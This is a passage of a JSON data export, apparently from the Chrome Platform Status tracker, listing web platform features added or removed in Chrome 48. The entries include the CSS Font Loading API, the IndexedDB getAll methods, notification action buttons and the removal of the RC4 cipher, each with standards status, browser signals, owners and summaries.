    },
    "first_of_milestone": true,
    "name": "CSS Font Loading API - FontFaceSet interface",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://drafts.csswg.org/css-font-loading/#fontfaceset",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/API/CSS_Font_Loading_API",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 48
        },
        "owners": [
          "toyoshim@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 48,
        "blink_components": [
          "Blink"
        ],
        "desktop": 48,
        "flag": false,
        "android": 48,
        "bug": "http://crbug.com/392075",
        "intervention": false
      },
      "opera": {
        "android": 35,
        "desktop": 35
      },
      "edge": {
        "view": {
          "url": "https://status.modern.ie/cssfontloadingapi",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=135390",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Update FontFaceSet to confirm the latest spec.\r\nNow, FontFaceSet behaves as setlike<FontFace> with entries(), keys(), values(), and iterator.\r\n(crbug.com/392075)\r\n\r\nAlso add() and remove() are changed not to throw InvalidModificationError on handling CSS-connected FontFaces.\r\n(crbug.com/510346)",
    "id": 4594172182921216,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/FontFaceSet"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/font-face-set/index.html"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:06.866410",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS font-feature-settings",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-fonts/#font-feature-settings-prop",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 48
        },
        "owners": [
          "kenjibaheux@chromium.org",
          "kojii@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 48,
        "ios": 48,
        "blink_components": [
          "Blink"
        ],
        "desktop": 48,
        "flag": false,
        "android": 48,
        "bug": "http://crbug.com/537293",
        "intervention": false
      },
      "opera": {
        "android": 35,
        "desktop": 35
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This property provides low-level control over OpenType font features. It is intended as a way of providing access to font features that are not widely used but are needed for a particular use case.\r\n\r\nCurrently available with the -webkit prefix. This is about shipping the unprefixed version AND deprecating the prefix version.",
    "id": 5831574356492288,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/font-feature-settings"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:29:00.833230",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate/Remove SVGGraphicsElement.getTransformToElement",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://lists.w3.org/Archives/Public/www-svg/2015Aug/att-0009/SVGWG-F2F-minutes-20150824.html#item02",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 48
        },
        "owners": [
          "shanmuga.m@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 48,
        "blink_components": [
          "Blink"
        ],
        "desktop": 48,
        "flag": false,
        "android": 48,
        "bug": "http://crbug.com/524432",
        "intervention": false
      },
      "opera": {
        "android": 35,
        "desktop": 35
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Remove the support of SVGGraphicsElement.getTransformToElement",
    "id": 5736166087196672,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:04.113500",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate/remove support for intrinsic and min-intrinsic",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 48
        },
        "owners": [
          "cbiesinger@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 48,
        "blink_components": [
          "Blink"
        ],
        "desktop": 48,
        "flag": false,
        "android": 48,
        "bug": "http://crbug.com/475104",
        "intervention": false
      },
      "opera": {
        "android": 35,
        "desktop": 35
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "intrinsic and min-intrinsic are webkit/blink-specific keywords for the standard fit-content and min-content keywords, recently unprefixed.\r\n\r\nintrinsic and min-intrinsic were deprecated in Chrome 47 and removed in Chrome 48.",
    "id": 5758434351775744,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:29:02.466700",
      "by": "ericbidelman@google.com"
    },
    "name": "Fetch API: data and blob schemes support",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://fetch.spec.whatwg.org/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 48
        },
        "owners": [
          "hiroshige@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 48,
        "ios": 48,
        "blink_components": [
          "Blink"
        ],
        "desktop": 48,
        "flag": false,
        "android": 48,
        "bug": "https://crbug.com/521475 https://crbug.com/521466",
        "intervention": false
      },
      "opera": {
        "android": 35,
        "desktop": 35
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Fetch to data or blob schemes:\r\n    fetch('data:...')\r\n    fetch('blob:...')\r\n",
    "id": 5744736207896576,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/GlobalFetch/fetch"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:29:05.769590",
      "by": "ericbidelman@google.com"
    },
    "name": "HTMLFrameElement.prototype.getSVGDocument()",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 48
        },
        "owners": [
          "philipj@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 48,
        "blink_components": [
          "Blink"
        ],
        "desktop": 48,
        "flag": false,
        "android": 48,
        "bug": "https://crbug.com/549323",
        "intervention": false
      },
      "opera": {
        "android": 35,
        "desktop": 35
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Per spec the getSVGDocument() method should be only on HTMLEmbedElement, HTMLIFrameElement and HTMLObjectElement.",
    "id": 5770159948038144,
    "resources": {
      "docs": [
        "https://html.spec.whatwg.org/multipage/embedded-content.html#svg-0"
      ]
    }
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2017-06-14 18:28:46.342410",
      "by": "ericbidelman@google.com"
    },
    "name": "Indexed DB: Replace DOMError with DOMException",
    "comments": "Intent thread: https://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/XAlBg66UB7c/G4GNCFLnwCQJ",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://w3c.github.io/IndexedDB/",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://groups.google.com/a/chromium.org/d/msg/blink-dev/XAlBg66UB7c/wB1OPrb0BbUJ",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 48
        },
        "owners": [
          "jsbell@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 48,
        "flag": true,
        "android": 48,
        "bug": "https://crbug.com/460725",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "DOMError has been removed from the DOM standard in favor of\r\nDOMException, and the Indexed DB draft spec has been updated\r\nto use DOMException for error attributes.\r\n\r\nThe error attribute on IDBRequest and IDBTransaction will now\r\nreturn DOMException instances instead of DOMError instances.\r\nBoth types have 'name' and 'message' properties, so code that\r\ntests properties (e.g. request.error.name) or does logging\r\n(e.g. transaction.error.message) will be unaffected.",
    "id": 5645171886653440,
    "resources": {
      "samples": [
        "https://developer.mozilla.org/en-US/docs/Web/API/IDBRequest/error",
        "https://developer.mozilla.org/en-US/docs/Web/API/IDBTransaction/error"
      ]
    }
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2018-01-30 20:06:55.270880",
      "by": "jsbell@chromium.org"
    },
    "name": "IndexedDB getAll() methods",
    "tags": [
      "indexed db",
      "indexeddb",
      "idb",
      "database",
      "getall",
      "getallkeys",
      "objectstorenames",
      "openkeycursor",
      "v2"
    ],
    "comments": "Shipping in FF44: https://developer.mozilla.org/en-US/Firefox/Releases/44",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/IndexedDB/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=920633",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 48
        },
        "owners": [
          "jsbell@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 48,
        "blink_components": [
          "Blink"
        ],
        "desktop": 48,
        "flag": false,
        "android": 48,
        "bug": "https://crbug.com/525742",
        "intervention": false
      },
      "opera": {
        "android": 35,
        "desktop": 35
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Indexed DB \"batched get\" APIs and two other methods that have been implemented in FF for some time\r\n\r\n* IDBObjectStore.getAll()\r\n* IDBObjectStore.getAllKeys()\r\n* IDBIndex.getAll()\r\n* IDBIndex.getAllKeys()\r\n* IDBObjectStore.openKeyCursor()\r\n* IDBTransaction.objectStoreNames\r\n",
    "id": 6537756637396992,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/IDBObjectStore/getAll",
        "https://developer.mozilla.org/en-US/docs/Web/API/IDBObjectStore/getAllKeys",
        "https://developer.mozilla.org/en-US/docs/Web/API/IDBIndex/getAll",
        "https://developer.mozilla.org/en-US/docs/Web/API/IDBIndex/getAllKeys",
        "https://developer.mozilla.org/en-US/docs/Web/API/IDBObjectStore/openKeyCursor",
        "https://developer.mozilla.org/en-US/docs/Web/API/IDBTransaction/objectStoreNames"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/idb-getall/index.html"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-06-14 18:28:55.177020",
      "by": "ericbidelman@google.com"
    },
    "name": "MediaStreamTrack.remote attribute",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://w3c.github.io/mediacapture-main/getusermedia.html#widl-MediaStreamTrack-remote",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 48
        },
        "owners": [
          "hta@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 48,
        "ios": 48,
        "blink_components": [
          "Blink"
        ],
        "desktop": 48,
        "flag": false,
        "android": 48,
        "bug": "http://crbug.com/418540",
        "intervention": false
      },
      "opera": {
        "android": 35,
        "desktop": 35
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This allows Javascript to know whether a WebRTC MediaStreamTrack is from a remote source or a local one.\r\n",
    "id": 5698636931399680,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/MediaStreamTrack/remote"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:47.077770",
      "by": "ericbidelman@google.com"
    },
    "name": "More correct min-width/height: auto implementation for flex items",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://drafts.csswg.org/css-flexbox/#min-size-auto",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 48
        },
        "owners": [
          "cbiesinger@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 48,
        "blink_components": [
          "Blink"
        ],
        "desktop": 48,
        "flag": false,
        "android": 48,
        "bug": "http://code.google.com/p/chromium/issues/detail?id=546034",
        "intervention": false
      },
      "opera": {
        "android": 35,
        "desktop": 35
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The implied minimum size of a flex item (min-width: auto / min-height: auto) will now also work correctly when flex-basis is not auto.",
    "id": 5651186401148928,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/min-width"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-06-14 18:29:07.748950",
      "by": "ericbidelman@google.com"
    },
    "name": "Notification action buttons",
    "tags": [
      "notification",
      "buttons",
      "actions",
      "notifications",
      "button",
      "action"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://notifications.spec.whatwg.org/#actions",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/whatwg/notifications/pull/48#issuecomment-151231911",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 48
        },
        "owners": [
          "johnme@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 48,
        "flag": false,
        "android": 48,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=513672",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Support for the NotificationOptions.actions, Notification.actions and Notification.maxActions attributes, which allow authors to show action buttons alongside a notification.\r\n\r\nThese allow users to quickly handle the most common tasks for a particular notification, without having to open the originating website.\r\n\r\nAs of Chrome 53, the `Notification.actions` property is exposed as well.",
    "id": 5906566364528640,
    "resources": {
      "docs": [
        "https://notifications.spec.whatwg.org/#using-actions",
        "https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerRegistration/showNotification",
        "https://developer.mozilla.org/en-US/docs/Web/API/NotificationEvent/action"
      ],
      "samples": [
        "https://tests.peter.sh/notification-generator/#actions=3"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:29:15.155680",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove RC4",
    "tags": [
      "rc4",
      "tls",
      "ssl"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://tools.ietf.org/html/rfc7465",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://groups.google.com/forum/#!msg/mozilla.dev.platform/JIEFcrGhqSM/CIjtpwxoLQAJ",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 48
        },
        "owners": [
          "davidben@chromium.org",
          "rsleevi@chromium.org",
          "agl@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 48,
        "ios": 48,
        "blink_components": [
          "Blink"
        ],
        "desktop": 48,
        "flag": false,
        "android": 48,
        "bug": "https://crbug.com/548400",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "http://blogs.windows.com/msedgedev/2015/09/01/ending-support-for-the-rc4-cipher-in-microsoft-edge-and-internet-explorer-11/",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "RC4 is a 28 year old cipher that has done remarkably well, but it is now the subject of several, significant attacks. The IETF has decided that RC4 is sufficiently bad to warrant a statement that it must no longer be used (RFC 7465). When Chrome makes an HTTPS connection it has an implicit duty to do what it can to ensure that the connection is secure. At this point, the use of RC4 in an HTTPS connection is falling below that bar.",
    "id": 6493219084828672,
    "resources": {
      "docs": [
        "https://groups.google.com/a/chromium.org/forum/#!msg/security-dev/kVfCywocUO8/vgi_rQuhKgAJ"
      ],
      "samples": [
        "https://rc4.badssl.com"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:29:09.211300",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove SVG glyph-orientation-horizontal and glyph-orientation-vertical",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-writing-modes-3/#glyph-orientation",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 48
        },
        "owners": [
          "kojii@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 48,
        "blink_components": [
          "Blink"
        ],
        "desktop": 48,
        "flag": false,
        "android": 48,
        "bug": "http://crbug.com/543397",
        "intervention": false
      },
      "opera": {
        "android": 48,
        "desktop": 48
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Remove SVG glyph-orientation-horizontal and glyph-orientation-vertical properties.\r\n\r\nCSS Writing Modes evolved since SVG has forked its old specification and add these properties. It now includes better alternatives for these properties, and recommend to deprecate.\r\n\r\nSince the usage of these properties are low enough that simply removing them should simplify the work for both browser developers and web developers.\r\n\r\nWeb developers can now use CSS text-orientation property for SVG text.",
    "id": 6002704107175936,
    "resources": {}
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:28:57.263380",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove darker composite operator",
    "tags": [
      "darker"
    ],
    "comments": "Motivation\r\n1. Compositing spec doesn't contain \"darker\" composite operator.\r\n2. \"darker\" is a quirk that is exclusive to WebKit.\r\n3. \"darker\" composite operator is implemented in the same way to \"darken\" blend mode. So web developers can use \"darken\" instead of \"darker\".",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 48
        },
        "owners": [
          "dongseong.hwang@intel.com",
          "junov@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 48,
        "blink_components": [
          "Blink"
        ],
        "desktop": 48,
        "flag": false,
        "android": 48,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=425628",
        "intervention": false
      },
      "opera": {
        "android": 35,
        "desktop": 35
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "deprecate darker composite operator because Compositing spec [1] doesn't contain \"darker\" composite operator.\r\n[1] http://dev.w3.org/fxtf/compositing-1",
    "id": 5712397973061632,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D/globalCompositeOperation"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:28:56.618400",
      "by": "ericbidelman@google.com"
    },
    "name": "SVGPathSeg interfaces",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.w3.org/TR/SVG11/single-page.html#paths-InterfaceSVGPathSeg",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 48
        },
        "owners": [
          "fs@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 48,
        "blink_components": [
          "Blink"
        ],
        "desktop": 48,
        "flag": false,
        "android": 48,
        "bug": "https://crbug.com/539385",
        "intervention": false
      },
      "opera": {
        "android": 35,
        "desktop": 35
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The SVGPathSeg interfaces were part of SVG 1.1, but have been removed.\r\n\r\nA polyfill is available at https://github.com/progers/pathseg",
    "id": 5708851034718208,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model",
        "https://developer.mozilla.org/en-US/docs/Web/API/SVGPathElement"
      ]
    }
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-04-26 07:51:59.635750",
      "by": "Patket@microsoft.com"
    },
    "name": "ServiceWorkerRegistration.update() does not bypass the browser HTTP cache",
    "tags": [
      "service",
      "worker",
      "serviceworker",
      "update",
      "registration"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://slightlyoff.github.io/ServiceWorker/spec/service_worker/index.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 48
        },
        "owners": [
          "jungkee.song@samsung.com",
          "falken@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 48,
        "flag": false,
        "android": 48,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=530540",
        "intervention": false
      },
      "opera": {
        "android": 35,
        "desktop": 35
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Before this feature, update() always bypassed the browser cache. Now, it only does so if the previous update check occurred over 24 hours ago.",
    "id": 5897293530136576,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerRegistration/update"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:37.726320",
      "by": "ericbidelman@google.com"
    },
    "name": "TextTrackList and TextTrackCueList item methods",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 48
        },
        "owners": [
          "philipj@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 48,
        "blink_components": [
          "Blink"
        ],
        "desktop": 48,
        "flag": false,
        "android": 48,
        "bug": "https://crbug.com/535475",
        "intervention": false
      },
      "opera": {
        "android": 35,
        "desktop": 35
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Per spec the TextTrackList and TextTrackCueList have anonymous indexed getters, but no item method:\r\nhttps://html.spec.whatwg.org/#texttracklist\r\nhttps://html.spec.whatwg.org/#texttrackcuelist",
    "id": 5208882079072256,
    "resources": {}
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:28:33.249100",
      "by": "ericbidelman@google.com"
    },
    "name": "Touch and TouchEvent constructors",
    "tags": [
      "Touch",
      "TouchEvent",
      "constructor"
    ],
    "comments": "WebKit bug: https://bugs.webkit.org/show_bug.cgi?id=147740",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/touch-events/#touch-interface",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/touch-events/pull/16#issuecomment-128419996",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 48
        },
        "owners": [
          "rbyers@chromium.org",
          "chongz@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 48,
        "blink_components": [
          "Blink"
        ],
        "desktop": 48,
        "flag": false,
        "android": 48,
        "bug": "http://crbug.com/508675",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://github.com/w3c/touch-events/pull/16#issuecomment-128449085",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=147740",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The constructor creates a Touch/TouchEvent object from an init dictionary like other event types, also able to initialize UIEvent fields. More favorable than the old \"document.create... + e.init...\" way.",
    "id": 4923255479599104,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Touch/Touch",
        "https://developer.mozilla.org/en-US/docs/Web/API/TouchEvent/TouchEvent"
      ],
      "samples": [
        "https://jsbin.com/lohuwa"
      ]
    }
  },
  {
